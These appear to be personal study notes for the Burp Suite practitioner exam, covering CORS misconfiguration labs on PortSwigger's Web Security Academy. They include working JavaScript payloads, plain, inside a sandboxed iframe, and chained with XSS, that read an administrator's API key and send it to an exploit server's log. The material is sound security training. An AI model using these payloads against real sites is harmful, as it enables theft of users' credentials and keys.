### What is it?
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. The *same-origin policy (SOP)* is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.

### Look for
- `Access-Control-Allow-Origin` and/or `Access-Control-Allow-Credentials` response headers

### Identify Vulnerabilities in Exam
- `Access-Control-Allow-Credentials: true`
	- `Origin: hacker.com` > `Access-Control-Allow-Origin: hacker.com`
		- [CORS](CORS.md#2.1.%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20reflection%20%E2%AD%95%EF%B8%8F)
	- `Origin: null` > `Access-Control-Allow-Origin: null`
		- [CORS](CORS.md#2.2.%20Lab%20CORS%20vulnerability%20with%20trusted%20null%20origin%20%E2%AD%95%EF%B8%8F%0A%09-%20%60Origin%3A%20https%3A%2F%2Fhacker.YOUR-LAB-ID.web-security-academy.net%60%20%3E%20%60Access-Control-Allow-Origin%3A%20https%3A%2F%2Fhacker.YOUR-LAB-ID.web-security-academy.net%60%0A%09%09-%20%5B%5BBurp%20Exam%20Notes%2FStage%202%2FCORS%232.3.%20Lab%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols%20%E2%AD%95%EF%B8%8F)


---
#### 2.1. Lab: CORS vulnerability with basic origin reflection ⭕️
This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login > notice `GET /accountDetails` endpoint has a `Access-Control-Allow-Credentials` response header set to `true`.
	1. ![CORS-20260113164121196](CORS-20260113164121196.png)
2. Send to Repeater and add `Origin: hacker.com` in the request > Send > notice `Access-Control-Allow-Origin: hacker.com`.
	1. ![CORS-20260113164243676](CORS-20260113164243676.png)
3. #ExamTip  The following payload will save your/victim's API Key in the Access Log
```
<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>
```
![CORS-20260113164438233](CORS-20260113164438233.png)
![CORS-20260113164448635](CORS-20260113164448635.png)
4. Store > Deliver exploit to victim > Access Log and see the administrator's API Key. Submit it to solve.
	1. ![CORS-20260113164631872](CORS-20260113164631872.png)
>[!tip] How to Identify this Vulnerability?
>1. `Access-Control-Allow-Credentials` response header
>2. `Access-Control-Allow-Origin` response header reflects `Origin` header value

---
#### 2.2. Lab: CORS vulnerability with trusted null origin ⭕️ 
This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login > Inspect HTTP History for an endpoint with `Access-Control-Allow-Credentials` header: `GET /accountDetails`.
2. Send to Repeater > set `Origin: null` > Send > notice it got reflected in `Access-Control-Allow-Origin`.
	1. ![CORS-20260113165100688](CORS-20260113165100688.png)
3. Enter the payload below to get the admin's API key, submit and solve.
	1. ![CORS-20260113165636869](CORS-20260113165636869.png)
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

#ExamTip Use this payload for the BSCP exam (might work)
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
>[!tip] How to Identify this Vulnerability?
>1. `Access-Control-Allow-Credentials` response header
>2. `Access-Control-Allow-Origin` response header reflects `Origin` header value

---
#### 2.3. Lab: CORS vulnerability with trusted insecure protocols ⭕️
This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login and see `Access-Control-Allow-Credentials` in the `GET /accountDetails` request. Send to Repeater.
2. Sending `Origin: hacker.com` *DOES NOT* return `Access-Control-Allow-Origin`.
	1. ![CORS-20260113200305399](CORS-20260113200305399.png)
3. But adding `http://{subdomain}.YOUR-LAB-ID.web-security-academy.net` will get us the `Access-Control-Allow-Origin` head reflected. *http:// is important. https works too*.
	1. ![CORS-20260113200615806](CORS-20260113200615806.png)
4. Home > Select a product > Check stock. Inspect HTTP History and notice there's a subdomain `https//stock.YOUR-LAB-ID...`. Send to Repeater.
5. Although it didn't execute on the frontend, `productId` is vulnerable to XSS.
	1. ![CORS-20260113201109209](CORS-20260113201109209.png)
6. Leverage this XSS vulnerability to grab the victim's API Key, submit and solve.
	1. ![CORS-20260113201416321](CORS-20260113201416321.png)
```
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```
>[!tip] How to Identify this Vulnerability?
>1. `Access-Control-Allow-Credentials` response header
>2. `Access-Control-Allow-Origin` response header *DOES NOT* reflects `Origin` header value
>3. `Access-Control-Allow-Origin` *DOES* reflect if you add an arbitrary *subdomain* with the domain of the current web app

Another way to ID this lab: AJAX request.
![Pasted image 20260222195053](Pasted%20image%2020260222195053.png)







